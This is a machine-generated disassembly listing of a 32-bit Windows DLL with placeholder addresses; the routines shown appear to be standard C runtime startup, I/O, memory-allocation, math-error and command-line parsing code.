mov edi eax
call sub_1000d9d0
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000d94a
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1000a4da
push 0x10
push r--data
call sub_10009700
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10009745
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000da39
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1000a43e
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a596
mov eax [ ebp - 0x1c ]
sub_1000a59e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_100079a5
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1000a5cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_100056cc
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1000bae9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1000c0b2
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000a687
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] eax
je r-xdata
mov eax sub_1000dd71
push [ rw-data ]
call [ DecodePointer@IAT ]
jmp r-xdata
add ecx 0xfffffc18
cmp ecx 0xc
ja r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx 0xa6
push esi
cmp ecx edx
jg r-xdata
pop esi
leave
retn
jmp [ ecx * 4 + jump_table_1000a91f ]
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
cmp ecx 0x19
jg r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
fstp [ ebp - 0x20 ]
fld [ ecx ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x18 ]
push ecx
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
test eax eax
jne r-xdata
sub ecx 0x1a
je r-xdata
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
mov esi [ ebp + 0x10 ]
fstp [ esi ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
mov esi [ ebp + 0x10 ]
fmul [ ebp - 0x8 ]
fst [ esi ]
fld [ ecx ]
mov ecx [ ebp + 0xc ]
fstp [ ebp - 0x20 ]
fld [ ecx ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x10 ]
fstp [ esi ]
call sub_10007892
mov [ eax ] 0x21
call sub_10007892
mov [ eax ] 0x22
jmp r-xdata
fld1
mov eax [ ebp + 0x10 ]
fstp [ eax ]
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
push 0x2
pop edx
sub ecx edx
je r-xdata
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x28 ] 0x1
call eax
pop ecx
test eax eax
jne r-xdata
fld [ ecx ]
mov ecx [ ebp + 0xc ]
fstp [ ebp - 0x20 ]
fld [ ecx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
jmp r-xdata
mov [ ebp - 0x28 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
fstp [ ebp - 0x20 ]
fld [ ecx ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x18 ]
push ecx
fld [ esi ]
mov [ ebp - 0x28 ] 0x4
fstp [ ebp - 0x10 ]
call eax
pop ecx
jmp r-xdata
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
sub ecx 0x5
je r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x1d
je r-xdata
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec ecx
je r-xdata
sub ecx 0x3
jne r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x5
je r-xdata
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x9
jne r-xdata
mov [ ebp - 0x28 ] 0x3
sub_1000aa40
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000aaa8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10007b19
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1000aaed
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e74d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1000ab39
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e7cf
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1000ab87
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000abdc
mov edi edi
push esi
call sub_100087af
mov esi eax
push esi
call sub_10007bad
push esi
call sub_100076b6
push esi
call sub_1000eada
push esi
call sub_1000eacb
push esi
call sub_1000e8c6
push esi
call sub_1000e8b5
add esp 0x18
pop esi
retn
sub_1000ac0f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000ac33
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1000b93e
push r--data
push r--data
call sub_1000ac0f
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_1000d560
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1000b4d3
call sub_10007b02
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_1000d560
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1000acca
push 0x20
push r--data
call sub_10009700
push 0x8
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000adf5
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10009745
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1000bebf
pop ecx
push [ ebp + 0x8 ]
call sub_1000abb2
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_100087af
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_100087af
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1000ae4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1000aaed
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1000aaed
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1000b092
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_100079a5
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1000b0e5
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10008458
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1000aaed
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10006230
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10006230
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_100079a5
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1000aaed
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_100079a5
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10007d33
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100077ee
int3
add edi 0x4
sub_1000b1c1
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1000eb3c
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1000eb3c
pop ecx
test eax eax
je r-xdata
call sub_1000eb3c
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1000b35b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_10008458
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1000b1c1
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1000aaa8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1000b1c1
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000b416
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1000aaa8
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_100079a5
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1000b4ad
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000b4d3
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000b52b
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100088e6
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1000b675
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1000b52b
pop ecx
pop ecx
pop ebp
retn
sub_1000b695
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
